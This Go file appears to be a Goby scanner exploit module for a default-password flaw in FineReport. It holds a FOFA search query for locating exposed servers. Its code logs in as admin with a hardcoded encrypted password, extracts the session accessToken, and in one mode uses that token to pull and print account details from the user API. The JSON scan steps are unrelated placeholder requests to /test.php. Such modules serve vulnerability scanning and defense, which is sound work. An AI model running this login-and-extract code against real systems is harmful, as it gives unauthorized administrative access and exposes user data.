package exploits

import (
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "FineReport /login Default Password Vulnerability",
    "Description": "<p>FineReport is an enterprise-level report design and data analysis tool and business intelligence platform developed by FineFineReport. </p><p>There is a default password vulnerability in FineReport, and an attacker can use admin/123456 to log in to the FineReport backend.</p>",
    "Product": "FineReport",
    "Homepage": "http://www.fanruansem.com/",
    "DisclosureDate": "2024-09-27",
    "PostTime": "2024-09-27",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "body=\"/webroot/decision\" && body=\"/webroot/decision/file\"",
    "GobyQuery": "body=\"/webroot/decision\" && body=\"/webroot/decision/file\"",
    "Level": "1",
    "Impact": "<p>There is a default password vulnerability in FineReport, and an attacker can use admin/123456 to log in to the FineReport backend.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits. </p><p>2. If not necessary, prohibit public network access to the system. </p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "userMessage,default",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password",
        "2H1W"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "帆软报表 /login 默认口令漏洞",
            "Product": "帆软-FineReport",
            "Description": "<p>FineReport是帆软软件开发的企业级报表设计和数据分析工具与商业智能平台。<br></p><p>FineReport存在默认口令漏洞，攻击者可以使用admin/123456登录FineReport后台。<br></p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。&nbsp;</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。<br></p>",
            "Impact": "<p>FineReport存在默认口令漏洞，攻击者可以使用admin/123456登录FineReport后台。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "FineReport /login Default Password Vulnerability",
            "Product": "FineReport",
            "Description": "<p>FineReport is an enterprise-level report design and data analysis tool and business intelligence platform developed by FineFineReport.&nbsp;</p><p>There is a default password vulnerability in FineReport, and an attacker can use admin/123456 to log in to the FineReport backend.<br></p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.&nbsp;</p><p>3. Set access policies and whitelist access through security devices such as firewalls.<br></p>",
            "Impact": "<p>There is a default password vulnerability in FineReport, and an attacker can use admin/123456 to log in to the FineReport backend.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9957"
}`
	sendPayloadcsakscnyaulshcuyijoa7fchgahcljiugaschuao := func(hostInfo *httpclient.FixUrl) (bool, string, string) {
		// 注意：返回的第一个值为bool值，若弱口令登录成功请返回true，否则返回false
		vulInfo := ``
		vulPath := `/webroot/decision/login`
		requestConfig := httpclient.NewPostRequestConfig("/webroot/decision/login")
		requestConfig.VerifyTls = false
		requestConfig.Header.Store("Content-Type", "application/json")
		requestConfig.FollowRedirect = false
		requestConfig.Data = `{
  "username": "admin",
  "password": "7DLSeIXnsc1vyx840GQuDg==",
  "validity": -1,
  "sliderToken": "",
  "origin": "",
  "encrypted": true
}
`
		if resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig); err == nil {
			if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "accessToken") {
				re, err := regexp.Compile(`"accessToken":"((.|\n)*?)",`)
				if err != nil {
					return true, vulInfo, vulPath
				}
				//检查是否有匹配到内容
				if !re.MatchString(resp.RawBody) {
					return true, vulInfo, vulPath
				}
				match := re.FindStringSubmatch(resp.RawBody)
				vulInfo = match[1]
				return true, vulInfo, vulPath
			}
		}
		return false, vulInfo, vulPath
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			respBool, _, vulPath := sendPayloadcsakscnyaulshcuyijoa7fchgahcljiugaschuao(hostInfo)
			if respBool {
				ss.VulURL = hostInfo.Scheme() + "://admin:123456@" + hostInfo.HostInfo + vulPath
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			mode := goutils.B2S(ss.Params["mode"])
			if mode == "userMessage" {
				_, vulInfo, _ := sendPayloadcsakscnyaulshcuyijoa7fchgahcljiugaschuao(expResult.HostInfo)
				requestConfig := httpclient.NewGetRequestConfig("/webroot/decision/v10/user/account")
				requestConfig.VerifyTls = false
				requestConfig.Header.Store("Authorization", "Bearer "+vulInfo)
				requestConfig.FollowRedirect = false
				resp, err := httpclient.DoHttpRequest(expResult.HostInfo, requestConfig)
				if err != nil {
					expResult.Output = err.Error()
					expResult.Success = false
					return expResult
				}
				re, _ := regexp.Compile(`"data":{((.|\n)*?)}`)
				//检查是否有匹配到内容
				if !re.MatchString(resp.RawBody) {
					expResult.Success = false
					expResult.Output = "No data found"
					return expResult
				}
				match := re.FindStringSubmatch(resp.RawBody)
				vulInfo = match[1]
				//将vulInfo中的,替换为换行
				vulInfo = strings.ReplaceAll(vulInfo, ",", "\n")
				expResult.Output = vulInfo
				expResult.Success = true
			} else {
				expResult.Output = `Please use admin:123456 to login`
				expResult.Success = true
			}
			return expResult
		},
	))
}
